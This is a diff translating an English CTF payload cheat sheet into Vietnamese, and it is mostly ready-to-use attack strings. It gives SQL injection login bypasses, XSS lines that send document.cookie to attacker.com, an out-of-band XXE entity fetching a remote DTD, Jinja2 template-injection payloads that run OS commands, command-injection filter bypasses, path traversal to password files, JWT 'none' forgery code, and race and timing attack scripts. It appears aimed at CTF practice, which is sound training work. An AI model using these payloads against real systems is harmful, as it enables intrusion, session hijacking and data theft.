@@ -1,10 +1,10 @@
-# CTF Payload Cheat Sheet
+# Cẩm nang Payload CTF Tổng hợp (Cheat Sheet)
 
-Quick reference for common exploitation payloads used in these challenges.
+Sổ tay tra cứu siêu tốc các loại Payload khai thác thường được sử dụng nhất trong các bài thi CTF bảo mật.
 
-## 🔴 SQL Injection
+## 🔴 SQL Injection (SQLi)
 
-### Basic Authentication Bypass
+### Payload Bypass đăng nhập cơ bản
 ```sql
 ' OR '1'='1' --
 ' OR 1=1 --
@@ -13,28 +13,28 @@ admin' #
 ' OR 'a'='a
 ```
 
-### Union-Based SQLi
+### Dò quét bằng mệnh đề UNION (Union-Based)
 ```sql
 ' UNION SELECT NULL,NULL,NULL --
 ' UNION SELECT username,password FROM users --
 ```
 
-### Blind SQLi (Boolean-Based)
+### Tiêm mù bằng câu lệnh Logic (Boolean-Based Blind SQLi)
 ```sql
 ' OR (SELECT SUBSTR(value,1,1) FROM secrets)='F' --
-' AND 1=1 --  (true)
-' AND 1=2 --  (false)
+' AND 1=1 --  (Trả về đúng - Trang web hiển thị bình thường)
+' AND 1=2 --  (Trả về sai - Trang web báo lỗi hoặc mất nội dung)
 ```
 
-### Time-Based Blind SQLi
+### Tiêm mù bằng độ trễ thời gian (Time-Based Blind SQLi)
 ```sql
 ' OR SLEEP(5) --
 ' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --
 ```
 
-## 🟠 Cross-Site Scripting (XSS)
+## 🟠 XSS (Cross-Site Scripting)
 
-### Basic XSS
+### XSS cổ điển
 ```html
 <script>alert(1)</script>
 <script>alert(document.cookie)</script>
@@ -42,13 +42,13 @@ admin' #
 <svg onload=alert(1)>
 ```
 
-### Cookie Stealing
+### Payload đánh cắp Cookie
 ```html
 <script>fetch('http://attacker.com/?c='+document.cookie)</script>
 <img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
 ```
 
-### Bypass Filters
+### Kỹ thuật Bypass bộ lọc (WAF/Filter Bypass)
 ```html
 <ScRiPt>alert(1)</sCrIpT>
 <img src=x onerror="alert(1)">
@@ -56,35 +56,34 @@ admin' #
 <iframe src="javascript:alert(1)">
 ```
 
-## 🟡 Path Traversal
+## 🟡 Path Traversal (Duyệt thư mục)
 
-### Basic Traversal
-```
+### Lùi cấp cơ bản
+```text
 ../../../etc/passwd
 ..\..\..\..\windows\system32\config\sam
 ```
 
-### URL Encoded
-```
+### Bypass bằng URL Encoding
+```text
 ..%2F..%2F..%2Fetc%2Fpasswd
 ..%252F..%252F..%252Fetc%252Fpasswd
 ```
 
-### Null Byte (older systems)
-```
+### Đánh lừa bằng Ký tự Null (Null Byte) (Chủ yếu trên các hệ thống cũ)
+```text
 ../../../etc/passwd%00
 ```
 
-## 🟢 JWT Manipulation
+## 🟢 Thao túng JWT
 
-### Algorithm Confusion (None)
+### Tấn công Algorithm Confusion (alg: "none")
 ```json
 Header: {"alg":"none","typ":"JWT"}
 Payload: {"sub":"admin","role":"admin"}
-Token: eyJhbGc...eyJzdWI...
 ```
 
-### Python Script
+### Script Python tự động sinh Token giả
 ```python
 import base64, json
 
@@ -93,12 +92,12 @@ def base64url(data):
 
 h = base64url('{"alg":"none","typ":"JWT"}')
 p = base64url('{"sub":"admin","role":"admin"}')
-token = f"{h}.{p}."
+token = f"{h}.{p}."  # Cố tình bỏ trống phần chữ ký!
 ```
 
 ## 🔵 XXE (XML External Entity)
 
-### Basic File Read
+### Đọc file hệ thống cơ bản
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -107,7 +106,7 @@ token = f"{h}.{p}."
 <root>&xxe;</root>
 ```
 
-### Read Flag
+### Ví dụ đọc Flag
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE products [
@@ -118,7 +117,7 @@ token = f"{h}.{p}."
 </products>
 ```
 
-### Out-of-Band XXE
+### Nâng cao: Đánh cắp data bằng Out-of-Band (OOB XXE)
 ```xml
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
@@ -126,7 +125,7 @@ token = f"{h}.{p}."
 ]>
 ```
 
-## 🟣 Server-Side Template Injection (SSTI)
+## 🟣 SSTI (Server-Side Template Injection)
 
 ### Jinja2 (Python/Flask)
 ```jinja2
@@ -137,7 +136,7 @@ token = f"{h}.{p}."
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 ```
 
-### RCE Payloads
+### Payload thực thi mã từ xa (RCE)
 ```jinja2
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
 {{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
@@ -145,7 +144,7 @@ token = f"{h}.{p}."
 
 ## 🟤 CSRF (Cross-Site Request Forgery)
 
-### Auto-Submit Form
+### Mẫu HTML Form tự động submit
 ```html
 <html>
 <body>
@@ -158,14 +157,14 @@ token = f"{h}.{p}."
 </html>
 ```
 
-### Image Tag (GET requests)
+### Giả dạng bằng thẻ Ảnh (Cho phương thức GET)
 ```html
 <img src="http://target.com/transfer?to=attacker&amount=9000">
 ```
 
 ## ⚫ GraphQL
 
-### Introspection Query
+### Truy vấn nội quan (Introspection Query - Lấy cấu trúc API)
 ```graphql
 {
   __schema {
@@ -179,7 +178,7 @@ token = f"{h}.{p}."
 }
 ```
 
-### IDOR Query
+### Truy vấn khai thác IDOR
 ```graphql
 {
   user(id: 1) {
@@ -191,7 +190,7 @@ token = f"{h}.{p}."
 }
 ```
 
-### Batch Query
+### Truy vấn hàng loạt (Batch Query - Spam Request)
 ```graphql
 {
   user1: user(id: 1) { username secret }
@@ -200,34 +199,33 @@ token = f"{h}.{p}."
 }
 ```
 
-## 🔴 File Upload Bypass
+## 🔴 Bypass Upload File (Tải lên mã độc)
 
-### Double Extension
-```
+### Kỹ thuật nối đuôi kép (Double Extension)
+```text
 shell.php.jpg
 shell.php.png
 shell.jsp.jpg
 ```
 
-### Content-Type Manipulation
+### Bypass qua kiểm tra định dạng Header (Content-Type)
+Dùng Burp chặn Request và sửa:
 ```http
 Content-Type: image/jpeg
-(but upload .php file)
+(nhưng ruột thực tế vẫn tải lên file .php)
 ```
 
-### Magic Bytes
-```
-Add GIF89a or PNG header to PHP file
-```
+### Kỹ thuật nhồi Magic Bytes
+Chèn chuỗi `GIF89a` hoặc Header của PNG vào vị trí đầu tiên của file PHP để lừa cơ chế kiểm tra nội dung file (MIME sniffer).
 
-### Null Byte (older systems)
-```
+### Bơm Ký tự Null (Null Byte)
+```text
 shell.php%00.jpg
 ```
 
-## 🟠 Race Condition
+## 🟠 Khai thác lỗi tương tranh (Race Condition)
 
-### Python Script
+### Kịch bản Python đa luồng (Multi-threading)
 ```python
 import threading, requests
 
@@ -237,12 +235,13 @@ session = requests.Session()
 def exploit():
     session.post(url)
 
+# Chạy 10 request song song
 threads = [threading.Thread(target=exploit) for _ in range(10)]
 for t in threads: t.start()
 for t in threads: t.join()
 ```
 
-### Bash Script
+### Kịch bản Bash Script (Dùng Job Control)
 ```bash
 for i in {1..10}; do
   curl -X POST http://target.com/redeem &
@@ -250,9 +249,9 @@ done
 wait
 ```
 
-## 🟡 Timing Attack
+## 🟡 Timing Attack (Tấn công Kênh thời gian)
 
-### Python Script
+### Kịch bản Python dò từng ký tự
 ```python
 import requests, time, string
 
@@ -269,68 +268,68 @@ for pos in range(10):
         timings[char] = time.time() - start
     
     key += max(timings, key=timings.get)
-    print(f"Key: {key}")
+    print(f"Key hiện tại: {key}")
 ```
 
 ## 🟢 IDOR (Insecure Direct Object Reference)
 
-### URL Manipulation
-```
+### Thao túng trực tiếp trên URL
+```text
 /user/1
 /note/3
 /api/flag?uid=1
 /document?id=100
 ```
 
-### Cookie/Header Manipulation
+### Thao túng thông qua Cookie / Header HTTP
 ```http
 Cookie: user_id=1
 X-User-ID: 1
 Authorization: Bearer [token_with_admin_id]
 ```
 
-## 🔵 Parameter Tampering
+## 🔵 Parameter Tampering (Giả mạo tham số)
 
-### URL Parameters
-```
+### Sửa tham số truyền trên URL
+```text
 ?role=admin
 ?admin=true
 ?isAdmin=1
 ?user_type=administrator
 ```
 
-### Hidden Form Fields
+### Dùng Inspect sửa các Form ẩn (Hidden Form Fields)
 ```html
 <input type="hidden" name="price" value="0.01">
 <input type="hidden" name="role" value="admin">
 <input type="hidden" name="discount" value="100">
 ```
 
-## 🟣 Cookie Manipulation
+## 🟣 Thao túng Cookie
 
-### Browser DevTools
-```
-1. F12 → Application → Cookies
-2. Edit cookie value
-3. Refresh page
+### Bằng Trình duyệt (DevTools F12)
+```text
+1. Nhấn F12 → Chuyển sang tab Application → Mục Cookies
+2. Chỉnh sửa giá trị (Value) của Cookie
+3. F5 Refresh lại trang
 ```
 
-### curl
+### Bằng cURL
 ```bash
 curl -H "Cookie: role=admin; user=alice" http://target.com/
 ```
 
-### Python
+### Bằng Python
 ```python
 import requests
 cookies = {'role': 'admin', 'user': 'alice'}
 requests.get('http://target.com/', cookies=cookies)
 ```
 
-## 🟤 Information Disclosure
+## 🟤 Lộ lọt thông tin (Information Disclosure)
 
-### Common Files
-```
+### Các file cấu hình nhạy cảm cần soi
+```text
 /robots.txt
 /.git/
 /.env
@@ -341,32 +340,32 @@ requests.get('http://target.com/', cookies=cookies)
 /.htaccess
 ```
 
-### Directory Listing
-```
+### Các đường dẫn hay bật Directory Listing (Liệt kê thư mục)
+```text
 /admin/
 /backup/
 /uploads/
 /files/
 ```
 
-## ⚫ Password Reset Bypass
+## ⚫ Bypass chức năng Reset Mật khẩu
 
-### Predictable Tokens
-```
-username + year (alice2024)
-username + 123 (alice123)
+### Mẫu Token yếu, dễ đoán (Predictable Tokens)
+```text
+username + năm hiện tại (VD: alice2024)
+username + 123 (VD: alice123)
 MD5(username)
 ```
 
-### Token Reuse
-```
-Use same token multiple times
-Use token for different user
+### Lỗ hổng tái sử dụng Token (Token Reuse)
+```text
+Dùng 1 token duy nhất đổi mật khẩu được nhiều lần
+Lấy token của user này áp dụng cho user khác
 ```
 
-## 🔴 Command Injection
+## 🔴 Command Injection (Thực thi lệnh hệ thống OS)
 
-### Basic
+### Kỹ thuật nhồi lệnh cơ bản
 ```bash
 ; ls
 | whoami
@@ -375,124 +374,124 @@ Use token for different user
 $(whoami)
 ```
 
-### Bypass Filters
+### Lách các bộ lọc khoảng trắng (Bypass Filters)
 ```bash
 cat</etc/passwd
 cat${IFS}/etc/passwd
 c'a't /etc/passwd
 ```
 
-## 🟠 Encoding Tricks
+## 🟠 Các kỹ thuật Encoding nhào nặn Payload
 
-### URL Encoding
-```
-%20 = space
-%2F = /
-%3C = <
-%3E = >
-```
-
-### Double Encoding
-```
-%252F = %2F = /
-%253C = %3C = <
+### URL Encoding cơ bản
+```text
+%20 = Khoảng trắng
+%2F = Dấu gạch chéo /
+%3C = Dấu nhỏ hơn <
+%3E = Dấu lớn hơn >
 ```
 
-### Base64
+### Mã hóa Kép (Double Encoding - lách bộ lọc WAF)
+```text
+%252F  (Khi decode ra %2F, decode lần nữa ra /)
+%253C  (Khi decode ra %3C, decode lần nữa ra <)
+```
+
+### Base64 Encoding
 ```bash
 echo "admin' --" | base64
 YWRtaW4nIC0tCg==
 ```
 
-## 🟡 Useful curl Commands
+## 🟡 Các cước pháp cURL hữu ích trong thực chiến
 
-### POST Request
+### Nã POST Request cơ bản
 ```bash
 curl -X POST -d "username=admin&password=pass" http://target.com/login
 ```
 
-### With Cookies
+### Gửi Request kèm Cookie
 ```bash
 curl -b "session=abc123" http://target.com/dashboard
 ```
 
-### Save Cookies
+### Đăng nhập & Lưu trữ Cookie vào file cục bộ
 ```bash
 curl -c cookies.txt -d "user=admin&pass=pass" http://target.com/login
 curl -b cookies.txt http://target.com/dashboard
 ```
 
-### Custom Headers
+### Gửi kèm Header tùy chỉnh (VD: JWT Token)
 ```bash
 curl -H "Authorization: Bearer token123" http://target.com/api
 ```
 
-### Timing
+### Đo thời gian (Timing) phản hồi
 ```bash
 time curl -X POST -d "key=test" http://target.com/
 ```
 
-## 🟢 Burp Suite Tips
+## 🟢 Mẹo hay với Burp Suite
 
-### Repeater
-```
-Ctrl+R - Send to Repeater
-Ctrl+Space - Send request
-Ctrl+Shift+R - Change request method
-```
-
-### Intruder
-```
-1. Highlight payload position
-2. Click "Add §"
-3. Set payload type
-4. Start attack
+### Repeater (Lặp lại & Sửa Request)
+```text
+Ctrl+R         - Đẩy request đang bắt sang thẻ Repeater
+Ctrl+Space     - Phát yêu cầu đi ngay
+Ctrl+Shift+R   - Nhanh chóng đổi phương thức (Từ GET sang POST và ngược lại)
 ```
 
-### Decoder
-```
-Ctrl+Shift+D - Open Decoder
-Encode/Decode: Base64, URL, HTML, etc.
+### Intruder (Phá Pass/Brute-force)
+```text
+1. Bôi đen vị trí chuỗi cần Brute-force.
+2. Nhấn nút "Add §" để chốt mục tiêu.
+3. Chuyển sang tab Payload, chọn bộ từ điển (Wordlist).
+4. Nhấn Start Attack!
 ```
 
-## 🔵 Python Requests Template
+### Decoder (Con dao mã hóa)
+```text
+Ctrl+Shift+D   - Mở cửa sổ Decoder
+Hỗ trợ Encode/Decode 2 chiều: Base64, URL, HTML Entity, v.v.
+```
+
+## 🔵 Template Python Requests siêu tốc
 
 ```python
 import requests
 
-# Session (maintains cookies)
+# Tạo Session để nó tự nhớ và giữ Cookie cho mình
 s = requests.Session()
 
-# Login
+# 1. Bypass Đăng nhập
 r = s.post('http://target.com/login', data={
     'username': 'admin',
     'password': 'password'
 })
 
-# Authenticated request
+# 2. Xâm nhập các trang cần quyền
 r = s.get('http://target.com/dashboard')
 
-# With custom headers
+# 3. Request API kèm theo JWT Header tự chế
 headers = {'Authorization': 'Bearer token123'}
 r = s.get('http://target.com/api', headers=headers)
 
-# JSON request
+# 4. Gửi JSON Request (VD: GraphQL)
 r = s.post('http://target.com/api', json={
     'query': '{ user(id: 1) { secret } }'
 })
 
-print(r.text)
-print(r.json())
+print(r.text)   # Xem dạng văn bản
+print(r.json()) # Xem dạng JSON
 ```
 
 ---
 
-## 📝 Notes
+## 📝 Ghi chú cuối cùng
 
-- Always test on systems you own or have permission to test
-- Start with simple payloads and escalate
-- Use encoding when special characters are filtered
-- Check response codes, timing, and error messages
-- Document your findings
+- Tuyệt đối chỉ thử nghiệm Payload trên những hệ thống mà bạn làm chủ hoặc được cho phép (Nhà vô địch không bao giờ ngồi tù).
+- Hãy luôn bắt đầu với những Payload ngây thơ, đơn giản nhất trước khi dùng tới đao to búa lớn.
+- Khéo léo sử dụng Encoding nếu bạn nghi ngờ Payload đang bị tường lửa (WAF) chém.
+- Soi thật kỹ mã phản hồi HTTP (200, 403, 500), thời gian phản hồi (Timing) và các thông báo lỗi văng ra. Đôi khi manh mối nằm ngay trong lỗi.
+- Viết Report/Ghi chú ngay những gì bạn tìm thấy!
 
-**Happy Hacking! 🚩**
+**Chúc bạn hack vui vẻ! 🚩**
